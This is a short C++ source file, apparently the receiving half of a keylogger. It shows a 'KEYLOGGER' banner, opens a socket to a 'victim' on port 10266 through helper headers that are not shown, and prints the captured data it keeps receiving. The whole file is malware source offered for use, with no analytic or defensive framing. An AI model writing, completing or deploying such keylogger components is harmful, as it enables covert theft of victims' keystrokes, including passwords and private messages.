#include <WinSock2.h>
#include <iostream>
#include <WS2tcpip.h>
#include "errors.hpp"
#include "connections.hpp"
#pragma comment(lib, "Ws2_32.lib")

#define port 10266


int main()
{
    std::cout << "############################\n";
    std::cout << "##        KEYLOGGER       ##\n";
    std::cout << "############################\n";
    SOCKET victim = connect_to_client(port);

    while (true)
    {
        char bufc[100];
        ZeroMemory(bufc, sizeof(bufc));
        int r = recv(victim, bufc, sizeof(bufc), NULL);
        if (r > 0) std::cout << bufc;
        else if (r < 0) error("no se recibio bien el mensaje", WSAGetLastError());
    }
    return 0;
}